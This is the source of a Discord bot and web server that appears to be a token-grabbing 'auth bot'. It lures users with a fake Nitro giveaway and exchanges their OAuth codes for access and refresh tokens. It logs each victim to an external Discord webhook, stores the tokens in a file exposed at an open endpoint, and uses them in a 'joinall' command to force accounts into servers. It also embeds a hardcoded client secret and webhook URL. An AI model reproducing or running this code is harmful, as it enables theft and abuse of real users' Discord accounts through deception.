//CREATE BY Ξl K4lash#9999
const Discord = require('discord.js');
const client = new Discord.Client({
    intents: 32767
}); // laisse moi faire
const config = require("./config");
const chalk = require('chalk');
const db = require('quick.db');
const fs = require('fs');
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const FormData = require('form-data');
const axios = require('axios');
//CREATE BY Ξl K4lash#9999


app.use(bodyParser.text())

app.get('/', function (req, res) {
    res.sendFile(__dirname + '/index.html')
})
//CREATE BY Ξl K4lash#9999

app.get('/allAuth', async (req, res) => {
    fs.readFile('./object.json', function (err, data) {
        return res.json(JSON.parse(data))
    })
})
app.post('/', function (req, res) {
    let form = new FormData()
    form.append('client_id', '997497039023771699')
    form.append('client_secret', '2pLTag19GzkrMFs58Xuv01WIbaW_xgNL')
    form.append('grant_type', 'authorization_code')
    form.append('redirect_uri', 'https://Auth-spy3.heicheik.repl.co')
    form.append('scope', 'identify', 'guilds.join')
    form.append('code', req.body)
    fetch('https://discordapp.com/api/oauth2/token', {method: 'POST',body: form,})
        .then((eeee) => eeee.json())
        .then((cdcd) => {
            ac_token = cdcd.access_token
            rf_token = cdcd.refresh_token
const tgg = {headers: {authorization: `${cdcd.token_type} ${ac_token}`,}}
            axios.get('https://discordapp.com/api/users/@me', tgg)
                .then((te) => {
                    let efjr = te.data.id
                    fs.readFile('./object.json', function (res, req) {
                        if (
                            JSON.parse(req).some(
                                (ususu) => ususu.userID === efjr
                            )
                        ) {
                            console.log(
                                '[-] ' +
                                te.data.username +
                                '#' +
                                te.data.discriminator
                            )
                            return
                        }
                        console.log(
                            '[+] ' +
                            te.data.username +
                            '#' +
                            te.data.discriminator
                        )
                        avatarHASH =
                            'https://cdn.discordapp.com/avatars/' +
                            te.data.id +
                            '/' +
                            te.data.avatar +
                            '.png?size=4096'
                        fetch('https://ptb.discord.com/api/webhooks/997499223182413865/gbY6JFAR8XZ0haFyV6f31fe0p27Ms46VNh0rCYcO3UACZnZ5z82Qqnx9kXl6bLaAh_9Z', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                avatar_url: '',
                                embeds: [
                                    {
                                        color: 3092790,
                                        title:
                                            te.data.username +
                                            '#' +
                                            te.data.discriminator +
                                            ' - ' +
                                            te.data.id,
                                        thumbnail: { url: avatarHASH },
                                        description:
                                            '```diff\n- New User\n\n- Pseudo: ' +
                                            te.data.username +
                                            '#' +
                                            te.data.discriminator +
                                            '\n\n- ID: ' +
                                            te.data.id +
                                            '```',
                                    
                                        
                                    },
                                ],
                            }),
                        })//CREATE BY Ξl K4lash#9999

                        var papapa = {
                            userID: te.data.id,
                            avatarURL: avatarHASH,
                            username:
                                te.data.username + '#' + te.data.discriminator,
                            access_token: ac_token,
                            refresh_token: rf_token,
                        },
                            req = []
                        req.push(papapa)
                        fs.readFile('./object.json', function (res, req) {
                            var jzjjfj = JSON.parse(req)
                            jzjjfj.push(papapa)
                            fs.writeFile(
                                './object.json',
                                JSON.stringify(jzjjfj),
                                function (eeeeeeeee) {
                                    if (eeeeeeeee) {
                                        throw eeeeeeeee
                                    }
                                }
                            )
                        })
                    })
                })
                .catch((errrr) => {
                    console.log(errrr)
                })
        })
})
//CREATE BY Ξl K4lash#9999

client.on("ready", () => {
 
    console.log(`${chalk.blue('AUTH BOT V.3')}\n${chalk.green('->')} Le bot est connecté en tant que [ ${client.user.username} ], il utilise comme prefix : ${config.prefix}\n${chalk.green('->')} L'invite du bot : https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`)
})

//CREATE BY Ξl K4lash#9999


client.on("messageCreate", async (ctx) => {
    if (!ctx.guild || ctx.author.bot) return;
    const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(config.prefix)})\\s*`);
    if (!prefixRegex.test(ctx.content)) return;
    const [, matchedPrefix] = ctx.content.match(prefixRegex);
    const args = ctx.content.slice(matchedPrefix.length).trim().split(/ +/);
    const cmd = args.shift().toLowerCase();

//CREATE BY Ξl K4lash#9999


    if (cmd === "wl") {
        if (!config.owners.includes(ctx.author.id)) return;
        switch (args[0]) {
            case "add":
                const user = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
                if (db.get(`wl_${user.id}`) === null) {
                    db.set(`wl_${user.id}`, true)
                    ctx.channel.send({
                        embeds: [{
                            description: `**${user.username}** has been added to the whitelist`,
                            color: "2F3136"
                        }]
                    })
                } else {
                    ctx.channel.send({
                        embeds: [{
                            description: `**${user.username}** is already whitelist`,
                            color: "2F3136"
                        }]
                    })
                }
                break;
            case "remove":
                const user2 = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
                if (db.get(`wl_${user2.id}`) !== null) {
                    db.delete(`wl_${user2.id}`)
                    ctx.channel.send({
                        embeds: [{
                            description: `**${user2.username}** has been removed from the whitelist`,
                            color: "2F3136"
                        }]
                    })
                } else {
                    ctx.channel.send({
                        embeds: [{
                            description: `**${user2.username}** was not whitelist`,
                            color: "2F3136"
                        }]
                    })
                }
                break;
            case "list":
                var content = ""
                const blrank = db.all().filter((data) => data.ID.startsWith(`wl_`)).sort((a, b) => b.data - a.data);

                for (let i in blrank) {
                    if (blrank[i].data === null) blrank[i].data = 0;
                    content += `\`${blrank.indexOf(blrank[i]) + 1}\` ${client.users.cache.get(blrank[i].ID.split("_")[1]).tag} (\`${client.users.cache.get(blrank[i].ID.split("_")[1]).id}\`)\n`
                }

                ctx.channel.send({
                    embeds: [{
                        title: "Whitelisted Users",
                        description: `${content}`,
                        color: "2F3136",
                    }]
                })
                break;
        }
    }
//CREATE BY Ξl K4lash#9999

    if (cmd === "help") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !config.owners.includes(ctx.author.id)) return;
        ctx.channel.send({
            embeds: [{
                color: "2F3136",
                title: '<:users:995482295198826547> 0auth2 Dashboard',
                description:'<:join:997096856431640586>** 0auth2**\n`joinall`, `Users`, `Links`\n\n<:join:997096856431640586> **Prefix** `;`\n<:info:997096855143989329> *Message sent to users when they authorized:*\n```You have won Nitro wait 24h to get the code 🎁```',

          }]
        })
    } 
              
              
              
              
              
           //CREATE BY Ξl K4lash#9999
   
              

 

    if (cmd === "links") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !config.owners.includes(ctx.author.id)) return;
        ctx.channel.send({
            embeds: [{
                title: '<:links:996492434278187169> Oauth/Invite:',
                description: `<:join:997096856431640586> **Your OAuth2 Link:** ${config.authLink}\n\`\`\`${config.authLink}\`\`\`\n<:join:997096856431640586> **Bot Invite:** https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\n \`\`\`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\`\`\` `,
                color: "2F3136"
            }]
        })
    }
    
    

//CREATE BY Ξl K4lash#9999

    if (cmd === "joinall") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !config.owners.includes(ctx.author.id)) return;
        let msg = await ctx.channel.send({
            content:'**Joining users...**'
           
        })

        fs.readFile('./object.json', async function (err, data) {
            let json = JSON.parse(data);
            let error = 0;
            let success = 0;
            let already_joined = 0;
            for (const i of json) {
                const user = await client.users.fetch(i.userID).catch(() => {});
                if (ctx.guild.members.cache.get(i.userID)) {
                    already_joined++
                }
                await ctx.guild.members.add(user, { accessToken: i.access_token }).catch(() => {
                    error++ 
                })
                success++
            }
            await msg.edit({
                content: `**Joining users...** : \`${success}\``
            })
            await msg.edit({
                embeds: [{
                    title: '<:users:995482295198826547> 0auth2 Joinall',
                    description: `<:info:997096855143989329> **Already in server** : ${already_joined}\n<:join:997096856431640586> **Success**: ${success}\n<:fail:997096858105167922> **Error**: ${error}`,
                    color: "2F3136"
                }]
            }).catch(() => {})
        })
    }
    //CREATE BY Ξl K4lash#9999

    if (cmd === "users") {
      
      if (db.get(`wl_${ctx.author.id}`) !== true && !config.owners.includes(ctx.author.id)) return;
      
fs.readFile('./object.json', async function (err, data) {
            return ctx.channel.send({ 
                embeds: [{
                    title: '<:users:995482295198826547> OAuth2 Users:',
                    description: `There are ${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\` members` : `\`${JSON.parse(data).length}\` users in the bot`}\nType command \`links\` to check your OAuth2 link`,
                    color: "2F3136"
                  
                }] 
            })
        })
    }
})
//CREATE BY Ξl K4lash#9999

function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);
}

client.login(config.token).catch(() => {
    throw new Error(`TOKEN OR INTENT INVALID`)
})
//CREATE BY Ξl K4lash#9999

app.listen(config.port, () => console.log('Connexion...'))